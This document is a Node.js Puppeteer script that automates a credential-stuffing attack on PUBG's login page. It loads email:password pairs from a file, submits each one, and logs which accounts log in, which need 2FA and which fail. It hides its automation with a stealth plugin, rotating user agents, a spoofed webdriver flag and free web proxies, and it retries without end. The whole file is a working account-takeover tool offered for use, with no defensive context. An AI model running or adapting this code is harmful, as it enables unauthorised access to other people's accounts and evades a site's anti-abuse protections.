const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const fs = require("fs");
const { start } = require("repl");

// Use StealthPlugin to prevent detection
puppeteer.use(StealthPlugin());

const red = (text) => `\x1b[31m${text}\x1b[0m`;
const green = (text) => `\x1b[32m${text}\x1b[0m`;
const yellow = (text) => `\x1b[33m${text}\x1b[0m`;

// Function to check if an email is already in the checkedEmails file
async function isEmailChecked(email) {
  const checkedEmails = fs
    .readFileSync("checkedEmails.txt", "utf-8")
    .split("\n");
  return checkedEmails.some((line) => line.includes(email));
}

// Function to append email, password, and status to the checkedEmails file
async function appendToCheckedEmails(email, password, status) {
  const log = `${email}:${password} - ${status}\n`;
  fs.appendFileSync("checkedEmails.txt", log);
}

// Function to append email, password, and status to the 2FAEmails file
async function appendTo2FAEmails(email, password, status) {
  const log = `${email}:${password} - ${status}\n`;
  fs.appendFileSync("2FAEmails.txt", log);
}

// Function to append email, password, and status to the successEmails file
async function appendToSuccessEmails(email, password, status) {
  const log = `${email}:${password} - ${status}\n`;
  fs.appendFileSync("successEmails.txt", log);
}

// Function to launch the browser
async function launchBrowser() {
  const userAgents = [
    // Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",

    // Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",

    // Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",

    // Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",

    // Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:87.0) Gecko/20100101 Firefox/87.0",

    // Chrome on Android
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",

    // Safari on iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",

    // Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.48 Safari/537.36 Edg/91.0.864.48",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.818.62 Safari/537.36 Edg/90.0.818.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.774.63 Safari/537.36 Edg/89.0.774.63",
  ];

  const randomUserAgent =
    userAgents[Math.floor(Math.random() * userAgents.length)];

  const randomViewport = {
    width: Math.floor(Math.random() * (1400 - 1200 + 1)) + 1200,
    height: Math.floor(Math.random() * (900 - 700 + 1)) + 500,
  };

  const browser = await puppeteer.launch({
    // executablePath: "/opt/google/chrome/google-chrome", // for linux
    executablePath: "C:/Program Files/Google/Chrome/Application/chrome.exe", // for windows
    headless: true,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      "--disable-extensions",
      "--incognito", // Incognito mode
      "--disable-blink-features=AutomationControlled", // Disables automation detection
      "--window-size=200,100",
      "--window-position=0,0", // Set window position to top-left corner
    ],
  });

  const page = (await browser.pages())[0];
  const client = await page.target().createCDPSession();
  await client.send("Network.clearBrowserCookies");
  await client.send("Network.clearBrowserCache");

  await page.setUserAgent(randomUserAgent);
  await page.setViewport(randomViewport);
  await page.setRequestInterception(true);

  page.on("request", (req) => {
    if (["image", "stylesheet", "font"].includes(req.resourceType())) {
      req.abort();
    } else {
      req.continue();
    }
  });

  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, "webdriver", { get: () => false });
  });

  return { browser, page };
}

// Function to introduce a delay
async function Delay(time) {
  return new Promise((resolve) => {
    setTimeout(resolve, time);
  });
}

// Function to use proxy
async function useProxy(page, url) {
  const proxyWebsites = [
    {
      name: "CroxyProxy",
      url: "https://www.croxyproxy.com/",
      typeSelector: "#url",
      submitSelector: "#requestSubmit",
    },
    {
      name: "plainproxies",
      url: "https://plainproxies.com/resources/free-web-proxy",
      typeSelector: "body > section > div > div > div > form > div > input",
      submitSelector: "body > section > div > div > div > form > div > button",
    },
  ];

  // Randomly select a proxy website
  const randomProxy =
    proxyWebsites[Math.floor(Math.random() * proxyWebsites.length)];

  try {
    // Go to the selected proxy website
    await page.goto(randomProxy.url);

    // Type the URL to be proxied
    await page.type(randomProxy.typeSelector, url);

    // Click the submit button
    await page.click(randomProxy.submitSelector);

    // Wait for the page to load
    await Delay(2000);

    // Click the "Go" button to proceed to the proxied website
    await page.click(randomProxy.submitSelector);

    await page.waitForNavigation({ waitUntil: "networkidle2" });
  } catch (error) {}
}

// Function to wait for the login button to appear
async function waitForLoginButton(page) {
  try {
    await page.waitForFunction(
      () => {
        const element = document.querySelector(
          "#app-header > div > div.header__block.header__block--gnb > div.header__items.header__items--third > div.login.header__login > div > button > span:nth-child(2)"
        );
        return element && element.textContent.trim() === "Log-in";
      },
      { timeout: 10000 }
    );
  } catch (error) {
    console.error("Login button did not appear within the specified time.");
    throw error;
  }
}

// Function to navigate to the login page
async function NavigateToLogin(page) {
  try {
    await page.waitForSelector(
      "#app-modal > div > div > div.cookie__footer > button.base-button.cookie__footer-btn.base-button--clip-direction-end.base-button--confirm"
    );
    await page.click(
      "#app-modal > div > div > div.cookie__footer > button.base-button.cookie__footer-btn.base-button--clip-direction-end.base-button--confirm"
    );

    await waitForLoginButton(page);

    const initialUrl = page.url();
    let urlChanged = false;

    while (!urlChanged) {
      await page.click(".login__login-wrap > button");

      await Delay(3000);

      const currentUrl = page.url();
      if (currentUrl !== initialUrl) {
        urlChanged = true;
      }
    }
    await page.waitForNavigation({ waitUntil: "networkidle1" });
  } catch (error) {}
}

// Function to login and check status
async function login(page, email, password) {
  try {
    // clear the email and password fields
    await page.waitForSelector(
      "#loginForm > div > app-email-input > div > input"
    );

    await page.evaluate(() => {
      const emailInput = document.querySelector(
        "#loginForm > div > app-email-input > div > input"
      );
      const passwordInput = document.querySelector(
        "#loginForm > div > app-password-input > div > input"
      );

      if (emailInput && passwordInput) {
        emailInput.value = "";
        passwordInput.value = "";
      }
    });

    // Type the email and password
    await page.type("#loginForm > div > app-email-input > div > input", email, {
      delay: 100,
    });

    await page.type(
      "#loginForm > div > app-password-input > div > input",
      password,
      {
        delay: 100,
      }
    );

    // Wait for the login button to be enabled and click it
    await page.waitForFunction(() => {
      const submitButton = document.getElementById("submitButton");
      return submitButton && !submitButton.disabled;
    });
    await page.click("#submitButton");
  } catch (error) {}
}

// Function to check the status of the login
async function checkStatus(page, email, password) {
  try {
    const url = page.url();

    if (url.includes("mfa") || url.includes("MFATotp")) {
      await appendTo2FAEmails(email, password, "2FA");
      await appendToCheckedEmails(email, password, "Failed 2FA");
      console.log(yellow(`2FA required for: ${email}:${password}`));
      await page.goBack();
    } else if (url.includes("main?__cpo")) {
      await appendToCheckedEmails(email, password, "success");
      await appendToSuccessEmails(email, password, "Success");
      console.log(green(`Login successful for: ${email}:${password}`));
      await page.goBack();
    } else if (url.includes("oidcViews/en/oidclogin")) {
      await appendToCheckedEmails(email, password, "Failed");
      console.log(red(`Login failed for: ${email}:${password}`));
    } else if (!url.includes("oidcViews/en/oidclogin")) {
      await page.goBack();
    }
  } catch (error) {}
}

async function Start() {
  let browser;

  try {
    const fileContent = fs.readFileSync("emails.txt", "utf-8");
    const lines = fileContent.split("\n").filter((line) => line.trim() !== "");

    const launchResult = await launchBrowser();
    browser = launchResult.browser;
    const page = launchResult.page;

    await useProxy(page, "https://pubg.com/");
    await NavigateToLogin(page);
    await Delay(17000);

    for (const line of lines) {
      const [email, password] = line.split(":");

      if (await isEmailChecked(email)) {
        continue;
      } else {
        await login(page, email, password);
        await checkStatus(page, email, password);
        await Delay(4000);
      }
    }
  } catch (error) {
  } finally {
    if (browser) {
      await browser.close();
    }
    setTimeout(Start, 5000); // Retry after a delay
  }
}

Start();
